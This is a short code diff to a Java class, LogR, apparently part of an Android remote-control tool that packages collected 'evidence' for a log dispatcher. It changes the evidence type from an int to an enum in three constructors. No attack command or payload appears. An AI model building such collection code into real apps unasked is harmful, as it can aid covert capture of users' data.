@@ -8,6 +8,7 @@
  * *******************************************/
 package com.ht.RCSAndroidGUI;
 
+import com.ht.RCSAndroidGUI.evidence.EvidenceType;
 import com.ht.RCSAndroidGUI.utils.Utils;
 
 // TODO: Auto-generated Javadoc
@@ -17,7 +18,7 @@ import com.ht.RCSAndroidGUI.utils.Utils;
 public class LogR {
 
 	/** The type. */
-	private final int type;
+	private final EvidenceType type;
 
 	/** The unique. */
 	private final long unique;
@@ -61,15 +62,15 @@ public class LogR {
 	/**
 	 * Instantiates a new log, creates the evidence.
 	 * 
-	 * @param logType
+	 * @param evidence
 	 *            the log type
 	 * @param priority
 	 *            the priority
 	 */
-	public LogR(final int logType, final int priority) {
+	public LogR(final EvidenceType evidence, final int priority) {
 		unique = Utils.getUniqueId();
 		disp = LogDispatcher.self();
-		type = logType;
+		type = evidence;
 
 		final Packet p = new Packet(unique);
 
@@ -90,10 +91,10 @@ public class LogR {
 	 * @param additional
 	 *            the additional
 	 */
-	public LogR(final int logType, final int priority, final byte[] additional) {
+	public LogR(final EvidenceType evidence, final int priority, final byte[] additional) {
 		unique = Utils.getUniqueId();
 		disp = LogDispatcher.self();
-		type = logType;
+		type = evidence;
 
 		final Packet p = new Packet(unique);
 
@@ -116,11 +117,11 @@ public class LogR {
 	 * @param additional
 	 *            the additional
 	 */
-	public LogR(final int logType, final int priority, final byte[] additional,
+	public LogR(final EvidenceType evidence, final int priority, final byte[] additional,
 			final byte[] data) {
 		unique = Utils.getUniqueId();
 		disp = LogDispatcher.self();
-		type = logType;
+		type = evidence;
 
 		final Packet p = new Packet(unique);
 
